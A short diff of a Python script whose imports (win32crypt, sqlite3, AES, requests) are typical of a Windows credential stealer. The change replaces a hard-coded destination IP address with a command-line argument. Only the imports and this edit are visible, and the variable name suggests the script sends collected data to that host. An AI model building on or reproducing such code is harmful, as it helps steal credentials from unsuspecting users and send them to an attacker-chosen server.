@@ -7,7 +7,7 @@ import os, sys, requests, json, base64, sqlite3, win32crypt, shutil
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 
-dst_ip = "108.64.201.66"
+dst_ip = str(sys.argv[1])
 
 
 # helpful functions
